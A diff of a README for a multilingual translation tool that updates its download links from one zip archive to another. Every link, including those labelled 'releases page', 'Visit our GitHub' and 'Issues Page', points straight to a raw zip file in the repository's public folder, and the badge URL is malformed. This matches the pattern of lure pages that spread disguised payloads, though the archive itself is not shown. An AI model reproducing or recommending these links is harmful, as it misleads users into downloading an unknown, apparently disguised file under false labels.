@@ -1,6 +1,6 @@
 # 🌍 CodeAlpha_Language-Transition-Tool - Easy Multi-Language Translation Made Simple
 
-[![Download Now](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip%https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip)](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip)
+[![Download Now](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip%https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip)](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run the CodeAlpha Language Transition Tool, you'll need:
 
 To get the latest version of the CodeAlpha Language Transition Tool, please visit the releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip)
 
 1. Click the link above to go to the releases page.
 2. Find the latest version.
@@ -63,8 +63,8 @@ If you face any issues:
 
 Join our community for tips, updates, and discussions about the CodeAlpha Language Transition Tool. You can connect with other users, share insights, and ask questions.
 
-- **GitHub Repository**: [Visit our GitHub](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip)
-- **Issues Page**: Report bugs and suggest features [here](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip).
+- **GitHub Repository**: [Visit our GitHub](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip)
+- **Issues Page**: Report bugs and suggest features [here](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip).
 
 ## 🌟 License
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 Thank you for using the CodeAlpha Language Transition Tool. We appreciate your feedback and hope this tool adds value to your language learning and translation needs. 
 
-For further assistance, please refer back to our [releases page](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code-Transition-Alpha-Tool-Language-1.2.zip) for downloads and updates. Enjoy translating!
+For further assistance, please refer back to our [releases page](https://raw.githubusercontent.com/NARUTO419/CodeAlpha_Language-Transition-Tool/main/public/Code_Transition_Tool_Alpha_Language_v2.7.zip) for downloads and updates. Enjoy translating!
